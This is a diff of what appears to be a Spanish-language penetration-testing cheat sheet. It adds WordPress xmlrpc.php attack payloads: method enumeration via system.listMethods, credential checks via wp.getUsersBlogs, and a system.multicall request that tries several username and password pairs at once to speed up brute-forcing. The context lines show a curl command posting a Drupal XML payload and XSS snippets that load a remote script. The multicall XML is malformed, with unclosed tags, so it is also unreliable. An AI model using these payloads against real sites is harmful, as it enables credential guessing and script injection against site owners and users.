@@ -33,6 +33,36 @@ drupalxml.xml =>
 
 curl --data @drupalxml.xml IP/xmlrpc.php
 
+Wordpress =>
+	En Burp, al Repeater la petición GET, cambiamos por POST y añadimos de contenido:
+	<methodCall>
+	<methodName>system.listMethods</methodName>
+	<params></params>
+	</methodCall>
+	
+	Si está activo el wp.getUsersBlogs =>
+		<methodCall>
+		<methodName>wp.getUsersBlogs</methodName>
+		<params>
+		<param><value>user</value></param>
+		<param><value>pass</value></param>
+		</params>
+		</methodCall>
+	Si está activo el system.multicall y wp.getCategories =>
+		<methodCall><methodName>system.multicall</methodName>
+		 <member><name>methodName</name><value><string>wp.getCategories</string></value></member>
+		 <member><name>params</name><value><array><data>
+		 <value><string></string></value>
+		 <value><string>user</string></value>
+		 <value><string>pass</string></value>
+
+		 <member><name>methodName</name><value><string>wp.getCategories</string></value></member>
+		 <member><name>params</name><value><array><data>
+		 <value><string>user2</string></value>
+		 <value><string>pass2</string></value>
+
+		</methodCall>
+
 #XSS
 http://xss.rocks/xss.js
 <script>alert("test");</script>
